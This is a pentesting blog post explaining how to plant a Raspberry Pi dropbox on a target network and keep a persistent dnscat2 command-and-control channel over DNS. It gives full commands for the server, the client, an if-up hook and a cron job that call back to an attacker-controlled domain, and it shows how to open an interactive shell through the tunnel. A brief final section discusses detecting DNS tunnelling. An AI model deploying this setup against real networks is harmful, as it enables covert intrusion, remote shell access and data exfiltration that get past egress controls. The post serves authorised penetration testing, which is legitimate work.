---
draft: false
author: noah
comments: false
date: 2016-12-19T17:19:40-08:00
layout: post
slug: persistent-dnscat2
title: Persistent C2 with dnscat2
categories:
- Development
- PenTesting
tags:
- pentesting
---

Occasionally an environment has strict outbound rules with all traffic going through an authenticated proxy. This hampers exfiltration, especially if you don't currently have valid credentials but need a foothold into an environment without phishing for instance. If we can find a live network jack in some accessible place and the switch hands out an IP address via DHCP along with DNS servers, we can more than likely obtain a foothold into the network.

Thanks to some awesome work by [iagox86](https://twitter.com/iagox86), these directions can be used to configure [dnscat2](https://github.com/iagox86/dnscat2) to automatically connect back to your server over DNS in an automated fashion, similar to a PwnPlug.

## Prerequisites

* A linux box (raspberry pi)
* A domain name
* A VPS


## Directions

### Authoritative DNS
Configure an authoritative name server on the DNS provider account. Using namecheap for instance: 

Manage Domain > Advanced DNS > Add Personal DNS Servers > `ns1 == ip.ad.dre.ss` and `ns2 == ip.ad.dre.ss`

Then, under Domain > Use Custom DNS > use `ns1.examplecom` and `ns2.example.com`

Check this is working by running on the server: `sudo nc -vv -l -u -p53` and from another machine `nslookup ns1.example.com` to verify traffic is hitting this IP. 

### Set up dnscat2 server side

Log in to your VPS, get dnscat2, and install it.

    # apt-get update
    # apt-get -y install ruby-dev git make g++
    # gem install bundler
    # git clone https://github.com/iagox86/dnscat2.git
    # cd dnscat2/server
    # bundle install

And start the server.
 
    # ruby /home/admin/dnscat2/server/dnscat2.rb --secret=verysecret ns1.example.com

### Configure the client/Raspberry Pi

#### Compile the dnscat2 client

On the Raspberry Pi or client

    $ git clone https://github.com/iagox86/dnscat2.git
    $ cd dnscat2/client/
    $ make

At this point you can run dnscat2 with the following to confirm things are working. We'll be coming back to this so no need to keep in running.
    
    $ sudo /home/rpi/dnscat2/client/dnscat --secret=verysecret --dns domain=ns1.example.com,type=TXT
    
* You can also leave out the domain and instead specify an ip: `./dnscat --dns=server=1.2.3.4,port=53` but this is a direct connection out port 53 which may be blocked. It also clearly shows dnscat2 on the wire and will likely be flagged by IDS/IPS
* You can specify various DNS record types but TXT records have been fairly stable for me in the past


#### Configure Persistance

We want our little remote computer to always be connected to us. Every time it's plugged in, dnscat2 should be calling back to our infrastructure. In addition, DNS can be flaky so we always want to ensure there's always a callback.

Make `eth0` ask for a DHCP address everytime it's plugged in

    $cat /etc/networking/interfaces
      auto eth0
      allow-hotplug eth0
      iface eth0 inet dhcp

Add an `interface up` start script

    $cat /home/rpi/start_dnscat2
      #!/bin/bash    
      echo "[+] Starting dnscat2..."
      tmux new -s dnscat -d /home/rpi/dnscat2/client/dnscat ns1.example.com
    $ln -s  /home/rpi/start_dnscat2 /etc/network/if-up.d/start_dnscat2
    $chmod +x /home/rpi/start_dnscat2
    
Configure `cron` to check every five minutes if `dnscat2` is running and start it if not.

    $cat check_and_start_dnscat2.sh 
    #!/bin/bash

    if ! $(ps aux | grep -i "[t]mux" > /dev/null); then
    	echo "[!] Starting dnscat2..."
            /home/rpi/start_dnscat2
    else
    	echo "[+] dnscat2 is running..."
    fi

    $crontab -e
    */5 * * * * /home/rpi/check_and_start_dnscat2.sh


That's it. Now whenever an interface comes up, dnscat2 will make a connection to the configured domain and check every 5 minutes if there is a connection, starting one if not.


### dnscat2 reference
dnscat2 isn't super intuitive so some operational notes for quick reference:

* Start the server under a tmux session
* Within the dnscat2 prompt, type `sessions` to see what you have available and interact with `sessions -i 1`
* Within a session type `help` to list available commands and `shell` then `session -i <window#>` for an interactive shell
* Exit the shell session by `Control-z` or `exit`

### Identifying dnscat2 on the wire

There are number of ways to identify malicious DNS traffic and [this SANS paper](https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152) details quite a few methods of identification. In addition, in this case we're specifying TXT records which aren't too common. [One paper] (http://www.caida.org/publications/papers/2007/dns_anomalies/dns_anomalies.pdf) (Table 1) puts TXT record usage around 7% of a given large sample size. [Another](http://blog.dinaburg.org/2012/11/bitsquatting-pcap-analysis-part-2-query.html) puts that usage at closer to less than 1%.

It's difficult to directly prevent DNS tunnelling but with a bit of traffic and payload analysis an attacker who's not careful is likely to be identified.


### Resources

Most of this info is from iagox86's github and Lenny Zeltser's write up on dnscat2.

* https://github.com/iagox86/dnscat2
* https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md
* https://zeltser.com/c2-dns-tunneling/
* https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152
